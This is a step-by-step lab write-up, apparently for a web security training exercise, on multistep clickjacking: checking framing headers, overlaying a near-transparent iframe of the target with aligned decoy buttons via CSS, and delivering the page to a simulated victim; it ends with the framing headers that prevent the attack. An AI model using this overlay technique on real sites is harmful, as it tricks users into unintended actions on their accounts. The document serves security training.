# Lab 05 — Multistep Clickjacking

## Objective

Exploit a multistep clickjacking vulnerability where the victim must perform multiple interactions with a framed target page.

The attack requires the attacker to position multiple visible decoy elements over the corresponding controls in the target interface.

---

# Attack Concept

```text
Victim Opens Attacker Page
        ↓
Target Page Loaded in iframe
        ↓
Target Interface Hidden
        ↓
Decoy 1
        ↓
Victim Clicks
        ↓
Target Action 1
        ↓
Page State Changes
        ↓
Decoy 2
        ↓
Victim Clicks
        ↓
Target Action 2
        ↓
Final Result
```

---

# Step 1 — Identify the Target Workflow

Open the lab application and identify the sensitive workflow.

Determine:

```text
First action
Second action
Final action
```

The important part is understanding the sequence of interactions required by the target application.

---

# Step 2 — Record the Interaction Sequence

Use Burp Suite to inspect the application's behavior.

Open:

```text
Proxy → HTTP history
```

Identify the requests associated with the workflow.

Conceptually:

```text
Initial Page
      ↓
Action 1
      ↓
Action 2
      ↓
Final Action
```

---

# Step 3 — Confirm Frameability

Inspect the target response.

Check:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

especially:

```text
frame-ancestors
```

The target must be frameable for the clickjacking overlay.

---

# Step 4 — Create the iframe

Create an attacker-controlled page containing:

```html
<iframe
    src="https://YOUR-LAB-ID.web-security-academy.net/">
</iframe>
```

Replace:

```text
YOUR-LAB-ID
```

with the actual lab identifier.

---

# Step 5 — Create the First Decoy

Create a visible element corresponding to the first target action.

Example:

```html
<div class="decoy-one">
    Continue
</div>
```

Position it over the first target control.

---

# Step 6 — Create the Second Decoy

Create another visible element for the next target action.

Example:

```html
<div class="decoy-two">
    Confirm
</div>
```

The second decoy must correspond to the target control that becomes available after the first interaction.

---

# Basic CSS Structure

```html
<style>
    iframe {
        position: relative;
        width: 700px;
        height: 500px;
        opacity: 0.1;
        z-index: 2;
    }

    .decoy-one {
        position: absolute;
        top: 200px;
        left: 100px;
        z-index: 1;
    }

    .decoy-two {
        position: absolute;
        top: 300px;
        left: 100px;
        z-index: 1;
    }
</style>
```

The coordinates must be adjusted according to the target page.

---

# Step 7 — Test With Partial Opacity

Use:

```css
opacity: 0.1;
```

during development.

This allows the target interface to remain visible.

Verify:

```text
Decoy 1
   ↓
Target Control 1
```

and:

```text
Decoy 2
   ↓
Target Control 2
```

---

# Step 8 — Test the Sequence

The first click must trigger the first target action.

```text
Click Decoy 1
      ↓
Target Action 1
      ↓
Target Page Changes
```

Then the second click must trigger the next action.

```text
Click Decoy 2
      ↓
Target Action 2
```

---

# Important: Page State

The target page may change after the first interaction.

For example:

```text
Before Click 1
      ↓
Button A

After Click 1
      ↓
Button B
```

Therefore, the second decoy must be aligned with the target control in the page's new state.

---

# Step 9 — Adjust Positioning

If the first interaction works but the second does not, temporarily increase iframe visibility.

Use:

```css
opacity: 0.1;
```

Then inspect the target after the first interaction.

Adjust:

```text
top
left
width
height
```

for the second decoy.

---

# Step 10 — Hide the Target

Once the entire sequence is correctly aligned:

```css
opacity: 0.0001;
```

can be used.

The victim should now see only the attacker-controlled interface.

---

# Step 11 — Deliver the Exploit

Save the exploit page.

Use the authorized lab's:

```text
Deliver exploit to victim
```

functionality.

The victim interacts with the visible decoys.

---

# Complete Attack Flow

```text
Victim Logged In
       ↓
Attacker Page Opened
       ↓
Target Page Loaded
       ↓
iframe Hidden
       ↓
Decoy 1 Visible
       ↓
Victim Clicks
       ↓
Target Action 1
       ↓
Target State Changes
       ↓
Decoy 2 Corresponds to New State
       ↓
Victim Clicks
       ↓
Target Action 2
       ↓
Final Result
```

---

# Burp Suite Workflow

```text
Proxy
  ↓
HTTP History
  ↓
Identify Target Workflow
  ↓
Record Request Sequence
  ↓
Check Framing Headers
  ↓
Create iframe
  ↓
Create Decoy 1
  ↓
Create Decoy 2
  ↓
Test With Opacity
  ↓
Verify Action 1
  ↓
Verify Page State Change
  ↓
Align Action 2
  ↓
Verify Complete Sequence
  ↓
Reduce Opacity
  ↓
Deliver Exploit
```

---

# Troubleshooting

## First Click Works but Second Does Not

Check whether the target page changes after the first interaction.

```text
Click 1
   ↓
New page state
   ↓
Control position changes
```

Realign the second decoy.

---

## iframe Is Blocked

Inspect:

```http
X-Frame-Options
```

and:

```http
Content-Security-Policy
```

Look specifically for:

```text
frame-ancestors
```

---

## Decoys Are Misaligned

Temporarily use:

```css
opacity: 0.1;
```

Then adjust the positioning.

---

## Target Page Moves

Check whether the target:

```text
Scrolls
Redirects
Changes layout
Displays a new control
```

after each interaction.

The overlay must account for the new state.

---

# Testing Checklist

```text
☐ Identified multistep workflow
☐ Identified first target control
☐ Identified second target control
☐ Recorded interaction sequence
☐ Confirmed target page is frameable
☐ Created iframe
☐ Created first decoy
☐ Created second decoy
☐ Used partial opacity
☐ Verified first interaction
☐ Verified target state change
☐ Aligned second interaction
☐ Verified complete sequence
☐ Reduced iframe opacity
☐ Delivered exploit
☐ Confirmed final result
☐ Lab solved
```

---

# Key Learning

Multistep clickjacking requires more than simply hiding a single target button.

The attacker must account for:

```text
Multiple Interactions
        +
Target Page State
        +
Element Position
        +
Interaction Order
```

The attack can therefore be represented as:

```text
Decoy 1
   ↓
Target Action 1
   ↓
Page State Changes
   ↓
Decoy 2
   ↓
Target Action 2
```

Strong framing protections such as:

```http
X-Frame-Options: DENY
```

or:

```http
Content-Security-Policy: frame-ancestors 'none';
```

prevent the underlying framed-interface requirement.